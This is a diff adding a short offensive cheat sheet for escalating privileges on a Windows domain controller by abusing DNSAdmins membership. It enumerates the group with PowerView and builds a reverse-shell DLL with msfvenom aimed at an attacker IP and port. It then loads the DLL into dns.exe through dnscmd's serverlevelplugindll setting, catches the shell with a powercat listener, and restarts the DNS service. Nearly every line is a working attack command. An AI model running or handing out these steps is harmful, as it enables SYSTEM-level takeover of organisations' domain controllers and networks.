@@ -1,0 +1,33 @@
+#Find the members in the DNSAdmin
+. .\powerview.ps1
+Get-DomainGroup -SamAccountName "DNSAdmin"
+Get-DomainGroupMember -Name "DNSAdmin"
+
+#In this method, we load an arbitrary DLL with SYSTEM privileges on the DNS server. i.e., We will build a DLL which contains reverse tcp code and inject it into dns.exe process on the #victim’s DNS Server (DC). In case your work requires building a DLL which exports all necessary functions refer this post or this screenshot for building the DLL instead of msfvenom. You #can also use remote dll injector.
+
+#Building the DLL using msfvenom:
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll > privesc.dll
+
+#Python HTTP Server
+python -m SimpleHTTPServer
+
+
+#Injecting the DLL in dns.exe
+#C:\Windows\system32\dnscmd.exe
+
+
+dnscmd <FQDN of DC> /config /serverlevelplugindll \\UNC_path
+Example:
+dnscmd testmachine.test.local /config /serverlevelplugindll \\192.168.43.100\share\privesc.dll
+
+
+#Normally we cannot check if the dll was added, as it requires Administrator privileges, but in our case we did have an admin account, so we can check using the following command, from DC
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+
+#Start Listening
+. .\powercat.ps1
+powercat -l -p 4444 -Verbose
+
+#For restarting the server
+sc.exe <FQDN of DC> stop dns
+sc.exe <FQDN of DC> start dns
